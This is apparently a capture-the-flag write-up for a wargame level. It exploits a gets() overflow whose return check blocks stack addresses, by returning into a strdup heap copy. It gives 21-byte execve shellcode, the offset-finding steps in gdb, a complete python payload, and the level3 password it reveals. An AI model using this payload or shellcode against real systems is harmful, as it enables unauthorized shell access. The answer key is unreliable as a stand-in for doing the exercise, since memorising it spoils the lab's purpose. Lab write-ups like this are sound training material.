# Level 2 - Heap-Based Shellcode Injection

## Code Analysis

### Function Structure

The `main` function calls a secondary function `p`, which performs the following operations:

1. Flushes stdout
2. Calls `gets` with a buffer of 76 bytes
3. Implements a conditional check that prevents returning to stack addresses

### The Stack Protection Mechanism

An `if` statement validates the return address, blocking any attempts to redirect execution to the stack. This protection mechanism prevents traditional buffer overflow exploitation techniques.

### The Heap Allocation

The program uses `strdup`, which internally calls `malloc`. This operation copies the 76-byte buffer to the **heap** rather than keeping it on the stack.

## Exploitation Approach

### Why Not Heap Exploitation?

While the buffer resides on the heap, we don't need complex heap exploitation techniques. Instead, we employ **shellcode injection**.

### Understanding Shellcode Injection

Our strategy involves:
1. Injecting executable shellcode at the beginning of our payload
2. Padding the input to reach the EIP
3. Redirecting execution to our shellcode location

Since the stack protection prevents us from using arbitrary return addresses, we must use a legitimate address that points to our controlled memory.

## Finding the Return Address

### Using ltrace for Address Discovery

By tracing library calls, we identify that the return address remains constant:
```bash
ltrace ./level2
```

**Return address:** `0x0804a008`

This consistency is possible because ASLR is disabled on the system.

## Shellcode Selection

We use a compact 32-bit shellcode (21 bytes) that spawns a shell:
```
\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80
```

## Determining the Offset

We calculate the exact offset needed to overwrite the EIP:
```bash
python -c 'print "a" * 80 + "B" * 4' > /tmp/exploit
gdb ./level2
r < /tmp/exploit
```

The crash shows `0x42424242` ("BBBB"), confirming the offset is **80 bytes**.

## Crafting the Final Payload

Our payload structure:
- **21 bytes:** Shellcode
- **59 bytes:** Padding (to reach offset 80)
- **4 bytes:** Return address in little-endian format
```bash
python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "a" * 59 + "\x08\xa0\x04\x08"' > /tmp/exploit2
```

### Address Breakdown

The return address `0x0804a008` is written in little-endian as: `\x08\xa0\x04\x08`

## Executing the Exploit
```bash
cat /tmp/exploit2 - | ./level2
```

## Retrieving the Password

Once we have shell access:
```bash
cat /home/user/level3/.pass
```

## Credentials

**Username:** level3  
**Password:** `492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02`

## Summary

This level introduces shellcode injection techniques to bypass stack-based protections. Key concepts include:
- Understanding heap vs stack memory allocation
- Injecting executable shellcode
- Working within constraints imposed by security mechanisms
- Leveraging predictable memory addresses in non-ASLR environments
- Proper payload construction with shellcode, padding, and return addresses